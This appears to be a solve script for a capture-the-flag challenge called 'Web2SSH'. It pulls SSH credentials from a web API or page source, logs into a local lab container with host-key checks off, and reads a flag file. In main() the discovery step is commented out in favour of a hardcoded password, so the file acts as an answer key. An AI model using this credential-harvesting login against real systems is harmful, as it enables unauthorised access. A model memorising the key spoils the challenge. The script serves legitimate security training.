#!/usr/bin/env python3
"""
Solution Script for Web2SSH Challenge
====================================
Solve Path:
1. Connect to Web Service (HTTP port 8080 or mapped port).
2. Fetch webpage / API status endpoint to discover SSH username and password.
3. SSH into the container using the discovered credentials.
4. Read and return the per-user flag from /home/ctf/flag.txt.
"""

import sys
import re
import json
import os
import tempfile
import subprocess
import urllib.request

def get_web_clue(http_url):
    print(f"[*] Step 1: Connecting to web service at {http_url}...")
    
    # Try /api/status endpoint first
    status_url = f"{http_url.rstrip('/')}/api/status"
    try:
        req = urllib.request.Request(status_url)
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            user = data.get("ssh_user")
            password = data.get("ssh_pass")
            if user and password:
                print(f"[+] Discovered SSH Credentials via API: User='{user}', Password='{password}'")
                return user, password
    except Exception as e:
        print(f"[-] API endpoint fetch failed ({e}), falling back to HTML source inspection...")

    # Fallback to inspecting HTML source
    with urllib.request.urlopen(http_url) as resp:
        html = resp.read().decode('utf-8')
        user_match = re.search(r'Username:\s*(\w+)', html, re.IGNORECASE)
        pass_match = re.search(r'Password:\s*(\w+)', html, re.IGNORECASE)
        
        if user_match and pass_match:
            user = user_match.group(1)
            password = pass_match.group(1)
            print(f"[+] Discovered SSH Credentials via HTML Source: User='{user}', Password='{password}'")
            return user, password

    raise RuntimeError("Failed to extract SSH credentials from web service.")

def get_flag_via_ssh(ssh_host, ssh_port, user, password):
    print(f"[*] Step 2: Connecting to SSH service at {ssh_host}:{ssh_port} as user '{user}'...")
    
    # Method 1: Try Paramiko (recommended Python SSH library)
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ssh_host, port=ssh_port, username=user, password=password, timeout=10)
        
        stdin, stdout, stderr = client.exec_command("cat /home/ctf/flag.txt")
        flag = stdout.read().decode('utf-8').strip()
        client.close()
        if flag:
            return flag
    except Exception as e:
        print(f"[*] Paramiko attempt note: {e}. Falling back to OpenSSH SSH_ASKPASS...")

    # Method 2: Standard OpenSSH CLI using SSH_ASKPASS
    with tempfile.NamedTemporaryFile('w', delete=False) as f:
        f.write(f"#!/bin/sh\necho '{password}'\n")
        askpass_path = f.name
    
    os.chmod(askpass_path, 0o755)

    try:
        env = os.environ.copy()
        env['SSH_ASKPASS'] = askpass_path
        env['SSH_ASKPASS_REQUIRE'] = 'force'
        env['DISPLAY'] = ':0'

        cmd = [
            "ssh", "-p", str(ssh_port),
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            f"{user}@{ssh_host}",
            "cat /home/ctf/flag.txt"
        ]

        result = subprocess.run(cmd, env=env, capture_output=True, text=True, timeout=10)
        flag = result.stdout.strip()
        
        if not flag:
            raise RuntimeError(f"SSH execution returned empty flag. Stderr: {result.stderr}")
            
        return flag
    finally:
        if os.path.exists(askpass_path):
            os.remove(askpass_path)

def main():
    http_host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    http_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8081
    ssh_host = sys.argv[3] if len(sys.argv) > 3 else "127.0.0.1"
    ssh_port = int(sys.argv[4]) if len(sys.argv) > 4 else 2221

    http_url = f"http://{http_host}:{http_port}"
    
    # user, password = get_web_clue(http_url)
    user, password = "ctf", "web2ssh_access_2026"
    flag = get_flag_via_ssh(ssh_host, ssh_port, user, password)

    print(f"\n[======== SOLVED ========]")
    print(f"Flag: {flag}")
    print(f"[========================]\n")

if __name__ == "__main__":
    main()
